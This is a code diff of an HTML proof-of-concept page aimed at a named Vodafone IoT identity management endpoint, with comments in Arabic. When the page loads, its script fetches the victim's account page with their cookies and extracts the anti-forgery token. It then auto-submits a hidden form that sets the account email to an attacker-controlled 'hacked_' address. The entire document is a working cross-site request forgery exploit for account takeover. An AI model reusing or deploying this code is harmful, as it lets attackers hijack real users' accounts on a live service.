@@ -1,43 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical Security PoC</title>
+    <title>PoC 400 Bypass</title>
 </head>
 <body>
     <div id="msg" style="font-family: sans-serif; padding: 20px;">
-        <h2>Exploiting...</h2>
-        <p id="status">Step 1: Sniffing Token via CORS (GET)...</p>
+        <p id="status">Targeting: Vodafone IoT Identity...</p>
     </div>
 
     <script>
         const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
 
-        async function launchAttack() {
+        async function launchExploit() {
             try {
-                // 1. سحب التوكن (الـ GET مسموح وما ببعث OPTIONS Preflight)
-                const response = await fetch(target, { method: 'GET', credentials: 'include' });
+                // 1. أهم خطوة: عمل GET عشان المتصفح يسحب كوكيز الـ Antiforgery ويخزنها
+                document.getElementById('status').innerText = "Step 1: Synchronizing Anti-Forgery Cookies...";
+                const response = await fetch(target, { 
+                    method: 'GET', 
+                    credentials: 'include' 
+                });
+                
                 const html = await response.text();
                 const parser = new DOMParser();
                 const doc = parser.parseFromString(html, 'text/html');
                 const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
 
                 if (!token) {
-                    document.getElementById('status').innerText = "❌ Error: Token not captured. Are you logged in?";
+                    document.getElementById('status').innerText = "❌ Error: Token not captured!";
                     return;
                 }
 
-                document.getElementById('status').innerText = "Step 2: Token Captured! Bypassing OPTIONS via Form Submit...";
+                // 2. الضربة القاضية باستخدام الفورم (لأنه ببعث كل الكوكيز تلقائياً)
+                document.getElementById('status').innerText = "Step 2: Token & Cookies Ready! Launching CSRF...";
 
-                // 2. استخدام الفورم يدوياً (لأنه Simple Request ولا يخضع للـ Preflight)
                 const form = document.createElement('form');
                 form.method = "POST";
                 form.action = target;
 
-                // البيانات المطلوبة لتغيير الإيميل
-                const newEmail = `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`;
+                // البيانات بالظبط زي ما السيرفر بدقق عليها
                 const payload = {
                     "IsEmailConfirmed": "True",
-                    "Email": newEmail,
+                    "Email": `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`,
                     "PhoneNumber": "",
                     "Name": "Xia0Checkmate",
                     "Website": "",
@@ -47,7 +50,7 @@
                     "Region": "",
                     "PostalCode": "",
                     "Country": "",
-                    "__RequestVerificationToken": token // التوكن المسروق
+                    "__RequestVerificationToken": token
                 };
 
                 for (const key in payload) {
@@ -60,17 +63,16 @@
 
                 document.body.appendChild(form);
                 
-                // التنفيذ الفوري
                 setTimeout(() => {
                     form.submit();
                 }, 1000);
 
             } catch (err) {
-                document.getElementById('status').innerText = "❌ Critical Error: " + err.message;
+                document.getElementById('status').innerText = "❌ Error: " + err.message;
             }
         }
 
-        window.onload = launchAttack;
+        window.onload = launchExploit;
     </script>
 </body>
 </html>
